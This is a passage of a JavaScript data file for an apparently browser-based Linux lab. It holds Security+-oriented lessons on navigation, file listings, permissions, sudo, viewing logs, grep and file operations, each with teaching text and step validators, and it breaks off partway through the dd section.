/* ════════════════════════════════════════════════════════════
   linux-lessons.js · Lesson + challenge data for the Linux Lab
   → window.LINUX_LESSONS = { lessons: [...], challenges: [...] }

   Lessons follow the order of the CISCO "Linux Unhatched" notes.
   Challenges come from the SEC+ domain mapping in the linux-learning repo.

   Step validators (all optional, ANDed together):
     expectCmd      regex the typed command line must match
     expectOutput   regex the command's stdout must match  (m flag applied)
     refuteOutput   regex the output must NOT match
     expectFs       fn(api) -> bool, asserted against filesystem state
     expectNoError  the command must not have written to stderr
════════════════════════════════════════════════════════════ */
window.LINUX_LESSONS = (function () {
  "use strict";

  function mode(api, path) {
    var n = api.lookup(path);
    return n ? n.mode : null;
  }
  function exists(api, path) {
    return !!api.lookup(path);
  }

  /* ════════════════════════════════════════
     LESSONS
  ════════════════════════════════════════ */
  var lessons = [
    {
      id: "nav",
      title: "Navigation & Paths",
      blurb: "ls, pwd, cd, and the difference between absolute and relative",
      intro:
        "You are sysadmin@localhost, sitting in your home directory. Everything starts here.",
      teach:
        "<h3>The shape of every command</h3>" +
        "<p>Almost everything you type at a Linux shell follows one pattern:</p>" +
        "<pre>command [options] [arguments]</pre>" +
        "<p><b>Options</b> alter how the command behaves and are conventionally prefixed with a " +
        "dash — <code>-l</code>, <code>-r</code>, <code>-a</code>. <b>Arguments</b> tell the " +
        "command what to act on: a filename, a directory, a pattern.</p>" +
        "<p>Options combine freely and order does not matter. These three are identical:</p>" +
        "<pre>ls -l -r\nls -lr\nls -rl</pre>" +
        "<p>Both parts are usually optional. Bare <code>ls</code> lists the current directory; " +
        "<code>ls Documents</code> lists a different one; <code>ls -l Documents</code> does both.</p>" +
        "<h3>Reading the prompt</h3>" +
        "<p>Before you run anything, the prompt already tells you three things:</p>" +
        "<pre>sysadmin@localhost:~$\n│        │         │└ $ = ordinary user   (# = root)\n" +
        "│        │         └ where you are  (~ = your home directory)\n" +
        "│        └ the machine name\n└ who you are</pre>" +
        "<p>That <code>$</code> versus <code>#</code> distinction matters more than it looks. A " +
        "<code>#</code> means every command you type runs with full privilege and nothing will " +
        "stop you.</p>" +
        "<h3>pwd — print working directory</h3>" +
        '<p>The shell always has a "current directory," and most commands act on it by default. ' +
        "<code>pwd</code> prints it as a full path. When a command behaves unexpectedly, this is " +
        "the first thing to check — you are usually somewhere other than you assumed.</p>" +
        "<h3>The filesystem is one tree</h3>" +
        "<p>Linux has no drive letters. Everything hangs off a single root directory called " +
        '<code>/</code> — the rough equivalent of "My Computer," except it is a real directory ' +
        "you can <code>cd</code> into.</p>" +
        "<pre>/\n├── etc/     system configuration\n├── home/\n│   └── sysadmin/   ← your home, also written ~\n" +
        "│       ├── Documents/\n│       └── School/\n│           └── Art/\n├── tmp/     world-writable scratch space\n" +
        "└── var/\n    └── log/   system and security logs</pre>" +
        "<h3>Absolute vs relative paths</h3>" +
        "<p>An <b>absolute path</b> starts at <code>/</code> and spells out the location in full. " +
        "It means the same thing from anywhere on the system:</p>" +
        "<pre>cd /home/sysadmin/School/Art</pre>" +
        "<p>A <b>relative path</b> starts from wherever you currently are, so it has no leading " +
        "slash. If you are already in <code>/home/sysadmin</code>:</p>" +
        "<pre>cd School/Art</pre>" +
        "<p>Same destination, far less typing — but only correct from that starting point. Relative " +
        "paths can descend as many levels as you like; they just cannot skip upward without " +
        "<code>..</code>.</p>" +
        "<h3>The three shortcuts</h3>" +
        "<pre>~    your home directory      cd ~        → /home/sysadmin\n" +
        ".    the current directory     cp file .   → copy it here\n" +
        "..   the parent directory      cd ..       → up one level</pre>" +
        "<p>They chain like any other path component. <code>cd ../Documents</code> goes up one " +
        "level and straight back down into a sibling directory, and <code>cd ../..</code> goes up " +
        "two. Bare <code>cd</code> with no argument returns you home.</p>" +
        "<h3>Why this matters for Security+</h3>" +
        "<p>Nothing here is a SEC+ objective on its own. But every log you will be asked to " +
        "analyze lives at an absolute path like <code>/var/log/auth.log</code>, and every exam " +
        'scenario that says "examine the configuration" assumes you can get there without ' +
        "thinking about it. This is the foundation the rest of the lab stands on.</p>",
      steps: [
        {
          task: "Print your working directory — find out where you actually are.",
          hint: "<code>pwd</code>",
          expectCmd: "^pwd\\s*$",
          expectOutput: "/home/sysadmin",
        },
        {
          task: "List the files in the current directory.",
          hint: "<code>ls</code>",
          expectCmd: "^ls\\s*$",
        },
        {
          task: "List them in reverse alphabetical order using the <code>-r</code> option.",
          hint: "<code>ls -r</code>",
          expectCmd: "^ls\\s+-\\w*r",
        },
        {
          task: "Move into the <code>Documents</code> directory using a <b>relative</b> path.",
          hint: "<code>cd Documents</code> — no leading slash.",
          expectCmd: "^cd\\s+Documents/?\\s*$",
          expectFs: function (api) {
            return api.cwd() === "/home/sysadmin/Documents";
          },
        },
        {
          task: "Go back up one level to the parent directory.",
          hint: "<code>cd ..</code>",
          expectFs: function (api) {
            return api.cwd() === "/home/sysadmin";
          },
        },
        {
          task: "Now jump to <code>/home/sysadmin/School/Art</code> in a single command using an <b>absolute</b> path.",
          hint: "Start the path with <code>/</code>.",
          expectCmd: "^cd\\s+/home/sysadmin/School/Art/?\\s*$",
          expectFs: function (api) {
            return api.cwd() === "/home/sysadmin/School/Art";
          },
        },
        {
          task: "Return home using the <code>~</code> shortcut.",
          hint: "<code>cd ~</code>",
          expectFs: function (api) {
            return api.cwd() === "/home/sysadmin";
          },
        },
      ],
      outro:
        "Absolute paths always work from anywhere; relative paths depend on where you stand.",
    },

    {
      id: "listing",
      title: "Long Listing & File Types",
      blurb: "Reading every field of ls -l, and the seven file types",
      intro:
        "The long listing is the densest output in Linux. Learn to read it left to right.",
      teach:
        "<p><code>ls -l</code> gives you a row per file. Every field matters:</p>" +
        "<pre>-rw-r----- 1 syslog adm 19573 Dec  7  2017 bootstrap.log\n" +
        "│└───┬───┘ │ └──┬─┘ └┬┘ └─┬─┘ └────┬────┘ └─────┬────┘\n" +
        "│    │     │    │    │    │        │            └ filename\n" +
        "│    │     │    │    │    │        └ timestamp\n" +
        "│    │     │    │    │    └ size in bytes\n" +
        "│    │     │    │    └ group owner\n" +
        "│    │     │    └ user owner\n" +
        "│    │     └ hard link count\n" +
        "│    └ permissions (user / group / other)\n" +
        "└ file type</pre>" +
        "<p>Nothing is separated by anything but spaces, which is why it looks impenetrable at " +
        "first. Take it one field at a time.</p>" +
        "<h3>Field 1 — the file type</h3>" +
        "<p>A single character, and there are seven of them:</p>" +
        "<pre>-   regular file        ordinary data: text, binaries, images\n" +
        "d   directory           a file whose contents are other files\n" +
        "l   symbolic link       a pointer to another file elsewhere\n" +
        "s   socket              two-way communication between processes\n" +
        "p   pipe (FIFO)         one-way communication between processes\n" +
        "b   block device        hardware, read in fixed-size blocks (disks)\n" +
        "c   character device    hardware, read one character at a time</pre>" +
        "<p>You will meet <code>-</code> and <code>d</code> constantly, <code>l</code> often, and " +
        "the other four mostly in <code>/dev</code>. Knowing they exist matters more than using " +
        "them: a file whose type does not match what its name implies is worth investigating.</p>" +
        "<h3>Field 2 — the permission bits</h3>" +
        "<p>Nine characters, read as three groups of three — user, group, other — each being " +
        "read/write/execute. Lesson 3 covers them properly; for now just notice the shape:</p>" +
        "<pre>rw- r-- ---\n│   │   └ other: nothing at all\n│   └ group: read only\n└ user:  read and write</pre>" +
        "<h3>Field 3 — the hard link count</h3>" +
        "<p>How many directory entries point at this same underlying data. Almost always " +
        "<code>1</code> for a regular file. Directories show at least <code>2</code>, because a " +
        "directory contains an entry for itself. You can safely ignore this field until you are " +
        "doing forensics.</p>" +
        "<h3>Fields 4 and 5 — owner and group</h3>" +
        "<p>The user who owns the file, then the group that owns it. In the example above the " +
        "file belongs to user <code>syslog</code> and group <code>adm</code>. Combined with the " +
        "permission bits, these two fields decide whether <i>you</i> can open the file — which is " +
        "why a log can be perfectly readable by root and refuse to open for you.</p>" +
        "<h3>Fields 6 and 7 — size and timestamp</h3>" +
        "<p>Size is in bytes by default (<code>-h</code> gives you human-readable K/M/G). The " +
        "timestamp is the last modification time, and its format changes with age: recent files " +
        "show <code>Mon DD HH:MM</code>, while anything older than about six months shows " +
        "<code>Mon DD  YYYY</code> instead, because the year becomes more useful than the minute.</p>" +
        "<h3>Field 8 — the name</h3>" +
        "<p>For a symbolic link the name field also shows where it points:</p>" +
        "<pre>lrwxrwxrwx 1 sysadmin sysadmin 32 Jul 15 10:30 notes -> /home/sysadmin/Documents/notes.txt</pre>" +
        "<h3>Hidden files</h3>" +
        "<p>Any filename beginning with a dot is hidden from a plain <code>ls</code>. This is not " +
        "a security feature — it is a display convention — but it is used constantly by attackers " +
        "for exactly that reason. <code>-a</code> shows everything:</p>" +
        "<pre>ls        Documents  School  alpha.txt\nls -a     .  ..  .bashrc  .profile  Documents  School  alpha.txt</pre>" +
        "<p><code>ls -la</code> is the combination you will actually type.</p>" +
        "<h3>Sorting</h3>" +
        "<pre>-t    by modification time, newest first\n-S    by size, largest first\n" +
        "-r    reverse whatever order is in effect\n-lt   long listing, newest first\n" +
        "-ltr  long listing, OLDEST first  (sort by time, then reverse)</pre>" +
        "<p><code>-ltr</code> is worth memorizing. On a log directory it puts the most recently " +
        "touched file at the <i>bottom</i> of the output, right above your prompt, where you can " +
        "actually see it without scrolling.</p>" +
        "<h3>Why this matters for Security+</h3>" +
        "<p>Domain 2.0 expects you to recognize indicators of compromise, and several of them are " +
        "visible in nothing more than a long listing: a hidden dotfile that nobody created, a " +
        "world-writable configuration file, a file owned by the wrong account, a timestamp that " +
        "does not match the change window, or a regular file sitting where a symlink is supposed " +
        "to be. <code>ls -la</code> is the cheapest triage command there is.</p>",
      note:
        "<p>Two fixes to the notes:</p>" +
        "<p><code>ls -v</code> is <b>not</b> verbose — <code>ls</code> has no verbose flag at all. " +
        "<code>-v</code> sorts version numbers naturally (so <code>file10</code> lands after " +
        "<code>file9</code>, not before it). <code>-v</code> <i>is</i> verbose for <code>cp</code>, " +
        "<code>mv</code>, and <code>rm</code>, which is probably where the note came from.</p>" +
        "<p>The symbolic-link type character is a lowercase <code>l</code>, not an uppercase " +
        "<code>L</code>. Uppercase <code>L</code> is not a file type.</p>",
      steps: [
        {
          task: "Show a long listing of the current directory.",
          hint: "<code>ls -l</code>",
          expectCmd: "^ls\\s+-\\w*l",
        },
        {
          task: "Show <b>all</b> files including hidden ones, in long form. Hidden files start with a dot.",
          hint: "<code>ls -la</code> — combine the options.",
          expectCmd: "^ls\\s+-\\w*[la]\\w*",
          expectOutput: "\\.bashrc",
        },
        {
          task: "Long-list <code>/var/log</code>. Look at the type character and the group owner.",
          hint: "<code>ls -l /var/log</code>",
          expectOutput: "bootstrap\\.log",
        },
        {
          task: "There is a symbolic link in your home directory. Long-list your home and find it — the row shows an arrow to its target.",
          hint: "<code>ls -l ~</code> and look for the <code>l</code> type character.",
          expectOutput: "notes ->",
        },
        {
          task: "List <code>/dev</code> in long form. You should see block, character, socket, and pipe types all in one place.",
          hint: "<code>ls -l /dev</code>",
          expectOutput: "^c",
        },
        {
          task: "Sort your home directory by file size, largest first.",
          hint: "<code>ls -lS</code>",
          expectCmd: "^ls\\s+-\\w*S",
        },
        {
          task: "Now sort by modification time, oldest first — sort by time, then reverse it.",
          hint: "<code>ls -ltr</code>",
          expectCmd: "^ls\\s+-(?=\\w*t)(?=\\w*r)\\w+",
        },
      ],
      outro: "You can now read any long listing without guessing at a column.",
    },

    {
      id: "perms",
      title: "Users & Permissions",
      blurb:
        "su vs sudo, permission triads, chmod, chown, and executing a file",
      intro:
        "You are sysadmin — an unprivileged user. Some things will be denied, and that is the lesson.",
      teach:
        "<h3>Who you are decides what you can do</h3>" +
        "<p>Every file carries an owner and a group, and every process runs as some user. When " +
        "you try to open a file, Linux compares the two and picks <b>one</b> triad to judge you " +
        "by — it does not combine them:</p>" +
        "<pre>if you are the owner        → the USER bits apply\n" +
        "else if you are in the group → the GROUP bits apply\n" +
        "else                         → the OTHER bits apply</pre>" +
        "<p>This is why being the owner can leave you with <i>less</i> access than a stranger. If " +
        "a file is <code>r--rw-rw-</code> and you own it, you get read-only and everyone else can " +
        "write — the first matching triad wins and matching stops there.</p>" +
        "<h3>The nine bits</h3>" +
        "<pre>rwx r-x r--\n│   │   └ other: read only\n│   └ group: read + execute\n└ user:  read + write + execute</pre>" +
        "<p>What r/w/x actually mean depends on whether the target is a file or a directory, and " +
        "this trips up almost everyone:</p>" +
        "<pre>          on a FILE                on a DIRECTORY\n" +
        "r    read the contents         list the names inside\n" +
        "w    modify the contents       create/delete/rename entries inside\n" +
        "x    run it as a program       enter it / traverse through it</pre>" +
        "<p>Two consequences worth remembering. A directory with <code>r</code> but no " +
        "<code>x</code> lets you see filenames but not open them. And <code>w</code> on a " +
        "directory lets you <b>delete a file you cannot even read</b> — deletion is a property of " +
        "the containing directory, not the file. That is why a world-writable directory is a " +
        "finding even when the files inside it look correctly locked down.</p>" +
        "<h3>chmod — change mode</h3>" +
        "<p>Only the file's owner or root may run it. There are two notations and both appear on " +
        "the exam.</p>" +
        "<p><b>Symbolic</b> — <code>chmod [who][action][perms] FILE</code>:</p>" +
        "<pre>who      u user · g group · o other · a all\n" +
        "action   + add · - remove · = set exactly (clears the rest)\n" +
        "perms    r read · w write · x execute</pre>" +
        "<pre>chmod u+x script.sh      give the owner execute\n" +
        "chmod go-w file          take write away from group and other\n" +
        "chmod a=r file           everyone read-only, nothing else\n" +
        "chmod u+x,g-w file       two clauses at once, comma-separated</pre>" +
        "<p>Symbolic mode is surgical: it changes only what you name and leaves everything else " +
        "alone.</p>" +
        "<p><b>Numeric (octal)</b> — one digit per triad, adding up the bits:</p>" +
        "<pre>r = 4    w = 2    x = 1\n\n" +
        "7 = rwx   6 = rw-   5 = r-x   4 = r--   0 = ---\n\n" +
        "chmod 755 script.sh   → rwxr-xr-x   owner full, everyone else read+run\n" +
        "chmod 644 notes.txt   → rw-r--r--   the default for a regular file\n" +
        "chmod 600 secrets     → rw-------   owner only, the right mode for keys\n" +
        "chmod 750 run.sh      → rwxr-x---   owner full, group runs it, other nothing</pre>" +
        "<p>Numeric mode sets all nine bits at once, so it overwrites anything already there. " +
        "<code>chmod 777</code> — read, write, and execute for absolutely everyone — is the " +
        "canonical wrong answer on the exam and in real life.</p>" +
        "<h3>chown — change owner</h3>" +
        "<pre>chown newowner FILE\nchown newowner:newgroup FILE</pre>" +
        "<p>Root only. An ordinary user cannot give a file away, and cannot claim someone else's — " +
        "if they could, quotas and access control would both collapse.</p>" +
        "<h3>su vs sudo</h3>" +
        "<p>Two different ways to stop being yourself, and the exam cares about the difference.</p>" +
        "<pre>su [user]        open a NEW SHELL as that user (root if unnamed)\n" +
        "                 lasts until you type `exit`\n" +
        "                 needs the TARGET account's password\n\n" +
        "sudo command     run ONE command as root, then drop straight back\n" +
        "sudo -u bob cmd  run one command as some other user\n" +
        "                 needs YOUR OWN password, and is logged</pre>" +
        "<p>Prefer <code>sudo</code>. It is time-boxed to a single command, it does not leave a " +
        "privileged shell sitting open for whoever walks past, and every invocation is written to " +
        'the auth log with the real user\'s name attached — so "who ran this" has an answer. A ' +
        "root shell opened with <code>su</code> logs one line at the start and nothing after; " +
        "everything done inside it is anonymous.</p>" +
        "<h3>Running a program: the ./ prefix</h3>" +
        "<p>Two separate things must be true to run a script:</p>" +
        "<pre>chmod u+x hello.sh    1. it needs the execute bit\n" +
        "./hello.sh            2. you must say where it is</pre>" +
        "<p>The shell only searches the directories listed in <code>$PATH</code>, and the current " +
        "directory is deliberately <b>not</b> among them. If it were, dropping a malicious file " +
        "named <code>ls</code> into a shared directory would hijack the next person who typed " +
        '<code>ls</code> there. <code>./</code> means "the one right here," stated explicitly.</p>' +
        "<h3>Why this matters for Security+</h3>" +
        "<p>This lesson <i>is</i> least privilege — objective 3.x — expressed as commands. The " +
        "exam will show you <code>chmod 777</code> on a config file and ask what is wrong; the " +
        "answer is that any local user can now rewrite it, which converts a low-privilege foothold " +
        "into whatever that config controls. It will also ask why <code>sudo</code> beats " +
        "<code>su</code>, and the answer is accountability: non-repudiation requires that the log " +
        'name a person, not just "root."</p>',
      note:
        '<p><code>su</code> means <b>switch user</b>, not "super user". Root is simply its default ' +
        "target when you give no username — <code>su sysadmin</code> switches to sysadmin just as " +
        "happily. The distinction matters on the exam: <code>su</code> is about <i>identity</i>, " +
        "<code>sudo</code> is about <i>authorization for one command</i>.</p>",
      steps: [
        {
          task: "Confirm who you are.",
          hint: "<code>whoami</code>",
          expectOutput: "sysadmin",
        },
        {
          task: "Try to read <code>/var/log/auth.log</code> directly. It should fail — read the error.",
          hint: "<code>cat /var/log/auth.log</code>",
          expectCmd: "auth\\.log",
        },
        {
          task: "Long-list <code>/var/log/auth.log</code> and work out <i>why</i> it failed — check the mode, owner, and group.",
          hint: "<code>ls -l /var/log/auth.log</code> — it is <code>rw-r-----</code>, owned by root:adm, and you are in neither.",
          expectOutput: "rw-r-----",
        },
        {
          task: "Now read it as root, for one command only.",
          hint: "<code>sudo cat /var/log/auth.log</code>",
          expectCmd: "^sudo\\s+cat",
          expectOutput: "Failed password",
        },
        {
          task: "Try to execute <code>hello.sh</code> with <code>./hello.sh</code>. It will be denied — it has no execute bit.",
          hint: "<code>./hello.sh</code>",
          expectCmd: "^\\./hello\\.sh",
        },
        {
          task: "Give the owner execute permission on <code>hello.sh</code> using symbolic mode.",
          hint: "<code>chmod u+x hello.sh</code>",
          expectFs: function (api) {
            return mode(api, "/home/sysadmin/hello.sh").charAt(2) === "x";
          },
        },
        {
          task: "Run it.",
          hint: "<code>./hello.sh</code>",
          expectOutput: "Hello, World!",
        },
        {
          task: "Set <code>hello.sh</code> to exactly <code>rwxr-xr-x</code> using <b>numeric</b> mode.",
          hint: "rwx=7, r-x=5, r-x=5 → <code>chmod 755 hello.sh</code>",
          expectFs: function (api) {
            return mode(api, "/home/sysadmin/hello.sh") === "rwxr-xr-x";
          },
        },
        {
          task: "Try to change the owner of <code>alpha.txt</code> to root without sudo. It fails — ownership changes are root-only.",
          hint: "<code>chown root alpha.txt</code>",
          expectCmd: "^chown",
        },
        {
          task: "Do it properly, with sudo.",
          hint: "<code>sudo chown root alpha.txt</code>",
          expectFs: function (api) {
            var n = api.lookup("/home/sysadmin/alpha.txt");
            return n && n.owner === "root";
          },
        },
      ],
      outro:
        "Least privilege in practice: you escalated for exactly one command each time, and the log knows it.",
    },

    {
      id: "viewing",
      title: "Viewing Files",
      blurb: "cat, head, and tail — and why you rarely want cat on a log",
      intro:
        "Three ways to get text out of a file, each suited to a different size of file.",
      teach:
        "<h3>cat — concatenate</h3>" +
        "<p>The name is a clue to its real job. <code>cat</code> was built to join files together " +
        "and print the result; displaying a single file is just the one-argument case.</p>" +
        "<pre>cat notes.txt              print one file\ncat a.txt b.txt            print both, joined end to end\n" +
        "cat /etc/passwd</pre>" +
        "<p>It dumps the <b>entire</b> file with no paging and no stopping. That is exactly right " +
        "for a short config file and exactly wrong for a 200 MB log — you will get thousands of " +
        "lines scrolling past and end up looking at the tail end by accident.</p>" +
        "<h3>head — the first lines</h3>" +
        "<pre>head file           first 10 lines (the default)\nhead -5 file        first 5\nhead -n 5 file      identical; both spellings are accepted</pre>" +
        "<p>Use <code>head</code> when you do not yet know what a file looks like. On a log, the " +
        "first few lines teach you the format — where the timestamp sits, which field is the " +
        "hostname, which is the service — and you need that before any pattern you write will be " +
        "correct.</p>" +
        "<h3>tail — the last lines</h3>" +
        "<pre>tail file           last 10 lines\ntail -5 file        last 5\ntail -f file        follow: keep printing new lines as they arrive</pre>" +
        "<p>Logs are append-only, so the end of the file is the present moment. <code>tail</code> " +
        'answers "what just happened," and <code>tail -f</code> leaves a live feed running while ' +
        "you reproduce a problem in another window — you watch the log react in real time.</p>" +
        "<h3>Choosing between them</h3>" +
        "<pre>short config file      cat\nunfamiliar file        head, to learn its shape\n" +
        "what happened just now tail\nwatching it live       tail -f\n" +
        "finding one thing      grep  (the next lesson)</pre>" +
        "<p>These also combine. <code>cat file | head -5</code> does the same job as " +
        "<code>head -5 file</code> — the pipe takes the output of the left command and feeds it " +
        "to the right instead of to your screen. You will use that constantly once " +
        "<code>grep</code> is in the mix.</p>" +
        "<h3>A note on permissions</h3>" +
        "<p><code>/var/log/auth.log</code> is mode <code>rw-r-----</code> owned by " +
        "<code>root:adm</code>. You are <code>sysadmin</code> — not the owner, not in " +
        "<code>adm</code> — so you fall to the <code>other</code> triad, which grants nothing. " +
        "Every read of that file needs <code>sudo</code> in front of it. That is not a quirk of " +
        "this simulation; it is how a hardened box is supposed to be configured.</p>" +
        "<h3>Why this matters for Security+</h3>" +
        "<p>Domain 4.0 is security operations, and log analysis is most of it. The pair " +
        "<code>sudo cat /var/log/auth.log | head -50</code> is taken verbatim from your own SEC+ " +
        "Lab 4.1 — read the top of the log to learn what normal looks like, so that abnormal has " +
        "something to stand out against. You cannot recognize an anomaly without a baseline, and " +
        "<code>head</code> is how you get one.</p>",
      steps: [
        {
          task: "Display the whole of <code>numbers.txt</code>.",
          hint: "<code>cat numbers.txt</code>",
          expectCmd: "^cat\\s+numbers\\.txt",
        },
        {
          task: "Show only the first 3 lines of <code>alpha.txt</code>.",
          hint: "<code>head -3 alpha.txt</code>",
          expectOutput: "^alpha$",
          refuteOutput: "delta",
        },
        {
          task: "Show only the last 2 lines of <code>alpha.txt</code>.",
          hint: "<code>tail -2 alpha.txt</code>",
          expectOutput: "^lima$",
          refuteOutput: "^alpha$",
        },
        {
          task: "Read the first 5 lines of <code>/var/log/auth.log</code> — you will need sudo. This is exactly the command from your SEC+ Lab 4.1.",
          hint: "<code>sudo head -5 /var/log/auth.log</code> or <code>sudo cat /var/log/auth.log | head -5</code>",
          expectOutput: "Accepted password",
        },
      ],
      outro: "head to learn the shape of a log, tail to see what it just did.",
    },

    {
      id: "grep",
      title: "grep & Regular Expressions",
      blurb: "Searching text, and the BRE/ERE distinction that trips people up",
      intro:
        "grep = Global Regular Expression Print. Every example below comes straight from your notes.",
      teach:
        "<p><code>grep [options] PATTERN [file]</code> prints every line matching the pattern.</p>" +
        "<p><b>Basic regular expressions (BRE)</b> — the default:</p>" +
        "<pre>.      any one single character\n" +
        "[ ]    any one of the specified characters\n" +
        "[^ ]   any one character NOT specified\n" +
        "*      zero or more of the previous character\n" +
        "^      start of line — but only as the first character of the pattern\n" +
        "$      end of line — but only as the last character of the pattern</pre>" +
        "<p><b>Extended regular expressions (ERE)</b> — requires <code>-E</code> (or " +
        "<code>egrep</code>):</p>" +
        "<pre>+      one or more of the previous pattern\n" +
        "?      the previous pattern is optional\n" +
        "{ }    specify a minimum and/or maximum count\n" +
        "|      logical OR\n" +
        "( )    grouping</pre>" +
        "<h3>The BRE/ERE trap</h3>" +
        "<p>In BRE those five ERE characters are <b>literal</b>. Without <code>-E</code>, " +
        "<code>grep 'e+'</code> does not mean \"one or more e\" — it searches for the two " +
        "characters <code>e</code> followed by <code>+</code>, and on a file with no plus signs " +
        "in it you get silence. No error, no warning, just zero results, which looks exactly like " +
        '"nothing matched." This is the single most common way a grep goes quietly wrong.</p>' +
        "<p>The classic workaround predates <code>-E</code> and still shows up everywhere: to get " +
        '"one or more e" in BRE, write one <code>e</code> followed by zero or more:</p>' +
        "<pre>grep 'ee*' red.txt      BRE:  one e, then any number more\ngrep -E 'e+' red.txt    ERE:  the same thing, said directly</pre>" +
        "<p>Both are correct. You will meet the first form in old scripts constantly.</p>" +
        "<h3>Anchors are positional</h3>" +
        "<p><code>^</code> and <code>$</code> are only special at the very start and very end of " +
        "the pattern. Anywhere else they are ordinary characters:</p>" +
        "<pre>grep 'r$' file      lines ENDING in r\ngrep '^r' file      lines STARTING with r\n" +
        "grep 'a^b' file     the literal three characters a ^ b\ngrep '^root:' /etc/passwd   the root line, not any line containing root</pre>" +
        "<p>Anchoring is how you stop a search from over-matching. <code>grep 'root' " +
        "/etc/passwd</code> also returns any account whose home directory or comment happens to " +
        "contain \"root\"; <code>grep '^root:'</code> returns exactly one line.</p>" +
        "<h3>Worked examples</h3>" +
        "<pre>grep 'r..f' red.txt     r, any TWO characters, f   → reef, roof\n" +
        "grep 're*d' red.txt     r, zero+ e, d              → red, reed, reeed, rd\n" +
        "grep '[0-9]' file       any line containing a digit\n" +
        "grep '[^0-9]' file      any line containing a NON-digit\n" +
        "grep -E 'roof|reel'     either word\n" +
        "grep -E '^re?d$'        exactly red or rd, nothing else</pre>" +
        "<p>Note that <code>*</code> applies to the single character before it, not to the whole " +
        'pattern — <code>re*d</code> is "r, then e repeated, then d," which is why bare ' +
        "<code>rd</code> matches: zero really does mean zero.</p>" +
        "<h3>Options worth knowing</h3>" +
        "<pre>-i    ignore case\n-v    invert — show the lines that DON'T match\n" +
        "-c    count matching lines instead of printing them\n-n    prefix each result with its line number\n" +
        "-E    use extended regular expressions\n-r    search a whole directory tree</pre>" +
        "<p><code>-c</code> and <code>-v</code> are the two that change how you investigate. " +
        '<code>-c</code> turns "show me the failures" into "how many failures," which is the ' +
        "difference between a wall of text and a number you can act on. <code>-v</code> lets you " +
        "subtract the noise you already understand and look at what is left.</p>" +
        "<h3>Why this matters for Security+</h3>" +
        "<p>A grep pattern is a detection rule. When you write <code>grep 'Failed password' " +
        "/var/log/auth.log</code> you are describing, by hand, what suspicious looks like — and " +
        "that is precisely what an IDS signature, an antivirus definition, and a Wazuh or Splunk " +
        "correlation rule are, just automated and running continuously. Learning regex here is " +
        "learning how those rules are expressed underneath. Domains 2.0 and 4.0 both lean on it.</p>",
      note:
        "<p>Your notes list <code>3121991</code> as a match for <code>grep '[^0-9]' " +
        "profile.txt</code>. It is not — that line is entirely digits, so it contains no non-digit " +
        "character to match. Run it below and you will see it correctly excluded.</p>",
      steps: [
        {
          task: "Find every line in <code>alpha-first.txt</code> that <b>ends</b> with the letter r.",
          hint: "<code>grep 'r$' alpha-first.txt</code>",
          expectOutput: "B is for Bear",
          refuteOutput: "Apple",
        },
        {
          task: "Find the root account's line in <code>/etc/passwd</code>.",
          hint: "<code>grep 'root' /etc/passwd</code>",
          expectOutput: "root:x:0:0",
        },
        {
          task: "In <code>red.txt</code>, find lines matching <code>r</code>, any two characters, then <code>f</code>.",
          hint: "<code>grep 'r..f' red.txt</code> — each dot is exactly one character.",
          expectOutput: "reef",
        },
        {
          task: "Find every line in <code>profile.txt</code> containing a digit.",
          hint: "<code>grep '[0-9]' profile.txt</code>",
          expectOutput: "3121991",
        },
        {
          task: "Now find every line containing a <b>non</b>-digit. Watch which line drops out.",
          hint: "<code>grep '[^0-9]' profile.txt</code>",
          expectOutput: "I am 37 years old",
          refuteOutput: "^3121991$",
        },
        {
          task: "In <code>red.txt</code>, match <code>r</code>, then zero or more <code>e</code>, then <code>d</code>.",
          hint: "<code>grep 're*d' red.txt</code> — note that <code>rd</code> matches, because zero is allowed.",
          expectOutput: "^rd$",
        },
        {
          task: "Match one or more <code>e</code> using only BRE — no <code>-E</code> allowed.",
          hint: "One <code>e</code> followed by zero or more: <code>grep 'ee*' red.txt</code>",
          expectCmd: "^grep\\s+(?!-E)",
          expectOutput: "reef",
          refuteOutput: "^rd$",
        },
        {
          task: "Now do the same thing with an extended regular expression and the <code>+</code> operator.",
          hint: "<code>grep -E 'e+' red.txt</code>",
          expectCmd: "-E",
          expectOutput: "reef",
        },
        {
          task: 'Count — don\'t print — how many lines in <code>/var/log/auth.log</code> contain "Failed password". Remember it needs sudo.',
          hint: "<code>sudo grep -c 'Failed password' /var/log/auth.log</code>",
          expectOutput: "^3$",
        },
      ],
      outro:
        "That last command is a detection rule written by hand — a SIEM does the same thing on a schedule.",
    },

    {
      id: "fileops",
      title: "File Operations",
      blurb: "cp, mv, rm, and when dd is the only thing that will work",
      intro:
        "Creating, copying, moving, and destroying. Two of these are irreversible.",
      teach:
        "<h3>cp — copy</h3>" +
        "<pre>cp SOURCE DESTINATION\n\ncp /etc/passwd .            copy it into the current directory\n" +
        "cp notes.txt notes.bak      copy to a new name\ncp a.txt b.txt Documents/   several sources into a directory\n" +
        "cp -r School/ backup/       -r is REQUIRED for directories</pre>" +
        '<p>The <code>.</code> shorthand is worth internalizing — "copy this here" is most of ' +
        "what you do. Without <code>-r</code>, <code>cp</code> refuses a directory rather than " +
        "silently copying only part of it.</p>" +
        "<h3>mv — move and rename</h3>" +
        "<p>One command for two jobs, because to the filesystem they are the same job: change the " +
        "directory entry that points at the data. Moving a file to a new name in the same " +
        "directory <i>is</i> a rename.</p>" +
        "<pre>mv old.txt new.txt              rename\nmv report.txt Documents/        move\n" +
        "mv a.txt b.txt c.txt School/    several at once — LAST argument is the destination</pre>" +
        "<p>Because the last argument is always the destination, the multi-source form only works " +
        "when it is a directory. <code>mv a.txt b.txt c.txt</code> would try to overwrite " +
        "<code>c.txt</code> and fail.</p>" +
        "<p>Note there is no <code>-r</code> here. Moving a directory moves everything inside it " +
        "by definition, because nothing is being copied — only the pointer changes.</p>" +
        "<h3>rm — remove</h3>" +
        "<pre>rm file.txt          delete a file\nrm -r OldFolder      delete a directory and everything in it\n" +
        "rm -R OldFolder      identical; -r and -R both mean recursive\nrm -f file           force: no complaint if it does not exist</pre>" +
        "<p>There is no undo, no recycle bin, and no confirmation by default. <code>rm</code> " +
        "unlinks the file and the space is immediately reusable.</p>" +
        "<p>Remember from the permissions lesson that deletion is governed by the <b>directory's</b> " +
        "write bit, not the file's. You can delete a read-only file you do not own, provided you " +
        "can write to the directory holding it — which is why world-writable directories matter.</p>" +
        "<h3>dd — the block-level copier</h3>" +
        "<p>Different tool for a different layer. <code>cp</code> works with files as the " +
        "filesystem presents them; <code>dd</code> reads and writes raw blocks, so it can copy " +
        "things that are not really files at all.</p>" +
        "<pre>dd if=INPUT of=OUTPUT bs=BLOCKSIZE count=BLOCKS\n\n" +
        "if=      input file    (where to read from)\nof=      output file   (where to write to)\n" +
